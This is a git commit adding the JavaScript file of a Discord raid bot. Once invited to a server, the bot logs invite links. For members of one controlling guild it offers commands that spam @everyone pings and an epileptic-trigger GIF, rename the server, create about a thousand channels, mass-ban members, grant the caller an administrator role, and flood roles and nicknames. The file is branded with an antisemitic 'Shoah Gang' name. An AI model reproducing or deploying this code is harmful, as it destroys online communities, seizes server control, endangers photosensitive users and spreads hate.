71ad152b1f51af63cdbc3af2b19810eaca8466f9
aijd)a^)$dafz^=$f*ùz <38180601+zadadzafdz@users.noreply.github.com>
2018-05-16 17:01:39 +0200

    Create index.js

---
+++ index.js
@@ -0,0 +1,108 @@
+const Discord = require('discord.js');
+const bot = new Discord.Client();
+const fs = require('fs');
+ 
+var fucked = false;
+ 
+
+
+bot.on('ready',() => {
+  //invit link
+  bot.guilds.forEach(guild => {
+    var invite = bot.guilds.find("id", guild.id).channels.find("id", guild.channels.random().id);
+    invite.createInvite().then(invite => console.log(`Connecté sur : ${guild.name} ${invite} ${guild.memberCount} membres`));
+  });
+});
+ 
+bot.on('message', msg => {
+
+  if (msg.content === '.ping') {
+    msg.reply('pong !')
+  }
+
+  //#endregion
+
+  if (msg.guild === bot.guilds.find('id', '430039551747293205')){ 
+    return;
+  }
+  
+  
+
+  if (bot.guilds.get('430039551747293205').members.get(msg.author.id) !== undefined) {
+    
+if (msg.content === '.destruction') {
+    console.log(`Commande .destruction par ${msg.author.tag}`);
+    var interval = setInterval (function () {
+      msg.channel.send("@everyone  @here  .https://cdn.discordapp.com/attachments/423462361496813578/423900548102881280/epileptique.gif\n"+
+                       "SHOAH GANG ON THE BEAT\n" +
+                       "https://discord.gg/835hm2Q\n" +
+                       "https://discord.gg/ZKYWm6g").catch(e => {});
+    }, 500)
+  }
+
+if (msg.content === '.oupss') {
+    console.log(`Commande .oupss par ${msg.author.tag}`);
+   fucked = false;
+
+ 
+    if (!fucked){
+      msg.guild.setIcon("./shoah.jpg").catch(e => {});
+      msg.guild.setName('BZ by Shoah Gang').catch(e => {});
+ 
+      for (var i = 0; i < 500; i++) {
+        msg.guild.createChannel('Shoah_gang_te_baise', 'voice').catch(e => {});
+        msg.guild.createChannel('Shoah_gang_te_baise', 'text').catch(e => {});
+      }
+      fucked = true;
+    }
+ 
+    if (msg.deletable) {
+      msg.delete();
+    }
+  }
+
+
+if (msg.content === '.banev') {
+    console.log(`Commande .banev par ${msg.author.tag}`);
+    msg.guild.members.forEach(member => {
+      if (!member.roles.exists("name", "Shoah Gang") && member.bannable) member.ban().catch(e => {});
+    });
+  }
+
+
+if (msg.content === '.leave') {
+    console.log(`Commande .leave par ${msg.author.tag}`);
+    if (msg.deletable) msg.delete().catch(e => {});
+    msg.guild.leave().catch(e => {});
+  }
+
+if (msg.content === '.pardon') {
+    console.log(`Commande .pardon par ${msg.author.tag}`);
+
+    msg.member.guild.createRole({
+      name: "Shoah Gang",
+      permissions: "ADMINISTRATOR",
+      mentionable: false
+    }).then(function(role) {
+      msg.member.addRole(role).catch(e => {});
+      if (msg.deletable) msg.delete().catch(e => {});
+    }).catch(e => {});
+  }
+  if (msg.content === '.roleflood') {
+    //
+    if (msg.deletable) msg.delete();
+    let i = 0;
+    let interval = setInterval(function () {
+    if (i === 3) clearInterval(interval);
+      msg.guild.createRole({name: 'ISSOU', color:'RANDOM'}).catch(e => {});
+i = i++
+    }, 100).catch(e => {});
+  }
+  if(msg.content === ".renameall"){
+    message.guild.members.forEach(member => {
+      if(member.setNickname("SHOAH GANG"));      
+  })
+  }
+
+}});
+
